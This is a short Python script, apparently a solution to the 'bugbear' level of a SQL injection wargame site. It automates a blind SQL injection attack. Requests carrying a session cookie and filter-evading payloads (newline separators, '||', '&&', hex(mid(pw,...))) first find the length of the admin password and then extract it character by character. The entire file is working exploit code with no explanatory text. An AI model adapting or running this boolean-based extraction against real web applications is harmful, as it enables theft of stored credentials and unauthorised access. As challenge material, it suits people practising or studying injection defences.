import requests

cookie = {'PHPSESSID' : 'oivj4gpboiappd0cmbckkco2kj'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?\
            no=1234%%0a||%%0aid%%0ain%%0a(\"admin\")%%0a%%26%%26%%0alength(pw)<%d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i-1
        print("Length of pw : %d" % pw_len)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?\
                no=1234%%0a||%%0aid%%0ain%%0a(\"admin\")%%0a%%26%%26%%0ahex(mid(pw,%d,1))<hex(%d)" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j-1)
            print("pw(%d) : %s" % (i+1, pw_value))
            break